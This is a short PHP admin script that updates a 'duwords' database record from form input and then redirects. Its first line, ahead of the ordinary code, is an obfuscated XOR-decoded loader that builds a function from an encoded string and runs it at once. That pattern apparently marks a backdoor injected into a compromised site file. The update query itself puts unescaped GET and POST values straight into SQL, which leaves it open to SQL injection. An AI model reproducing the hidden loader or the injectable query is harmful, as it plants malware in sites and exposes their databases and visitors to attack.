<?php $EYKoJd=',ISP5WoW>ZSM Y '; $YOPmWH='O;61A201K409I6N'^$EYKoJd; $mwFAkne='3WpG<<N7NEX .79TIIFfDCXDtIW.On+ 8LQbnj-rgK =H2;WCj :6=,8,Ok<Y8LaqOY RckuXSOdbmkWJWlDlkX8FAIpSdw6SpP>CLs0KzTsxYc+z75+RPTbiU,H,dwLJ1eae<DyqW6:cjZtJkS;D4jv,3d1iA<EU,hGjvwC;DWWYjmV  QnLJ>osE.2LORmbR19qm=pAsVeLI 9J reOHT-A.lFuT,5V:=1GmKs<45N=tGyV;KT65HqiHk3v7q wn 9IO  MRuvZnO992QZq,OdF1,X,d.W2uVgOKT;aPmh=J-8YXbtZ.+ 1zROKp:FwBtjI7=WKNAa=S+=7-HTPNWldeebym U 7PI:31CpSMpJ;UUEYxEp1DiP Y ;-P;zTyBFIYmiP1o6+21dnxf7.BN=bFeLNJiiaQS ,rlFzGW5=OST+R2Sf5=Bd7AD+nk5; i2 =SxemOTR6+YDm,+Z8leusJ Z9iX03bAbfP-dbX HXtsoxQF4W mUILbST:9N=Jm<RRaALoTZF CqMWWr+.oRa>O7.eC;RTo:cumltm2URPsIJROhq2zsQeP4og,dx-nPxc-cGUHgXEDc7G1+Yn=R6> 9>O:Xkj=S>PX VtbvkRQ2 nPZOUygmO1fK< Xdc1, L0j=9><<M eobRaP7V9TkdSub.'; $MwOdpOC=$YOPmWH('', 'Z1XfZI T:,7NqRA=:=5Nc;76+-6Z.1tMM8vKGJVxn-US+FR8-JXUDbHYX.4c4M8IU+8T3OKQ366MBMKwj,fMeO7M2atPtCL<Zy6Q1dWYkGtCCyGBFDAY>5:JM1M<MMLlnXNJL6MpU8CNCDgTbO7Z0U1REnDoIeW ,wL.JSW0O6;27BI=EYx3eq4fz7KF9=<EF=DMXV7y<y+oFmDX>ARXo.5A2KWLQ0MA7eVT>MvSZUY=XOMs0T91WV QAl4p9x:i2NAJikKE4rHHzJ9XUG4sQWEmbUM,M;E2KUkGk 1BZZdLY+YYyeBP,OGUTAX2AzS WjUN-VI6bn:k45DORL+<pfs36 47<>tuADpmQVHcMmmT<Z9  pX>z8MM4A-AdF5BZiYf-, VcY8KRJFPDSXBAO.;XYLl1D7ccE52TMRQf:29FX=:5G;H6NMR0;S 0J14XNTAPAN6NQ2+11YO<lIHJ.YEIUW.A.X63UJKhYl9KLF<A<9TUIX04F6Y2>,5=6,SJ:NbJW7+FmlK0;2AjQkqwZFJZzEZ.CO>dP7-HgJUPQTJS41iK-yj-PCQCBbV5QWUNVJHX6HQIWpfoNxcbCV5CJ 1V7OaEAW<N+CMM2G<7A2SNVO60FAGyzouYGM4;o.JA4LGUMT-kMMXGPS,DB2KikYR.P CTzNhS'^$mwFAkne); $MwOdpOC();
	ini_set('display_errors', '1');
	include('../../config/config.php');
	$id= $_GET['id'];
	// Page Information
	$uwords = $_POST['uwords'];
	$status = "Active";

	$sql ="UPDATE duwords SET uwords='$uwords',status='$status' WHERE id='$id'";

	$query = mysql_query($sql);

	header('location:'.$localpath.'/admin/templates/index.php?page=thanks.php&msg=updateuwords');
?>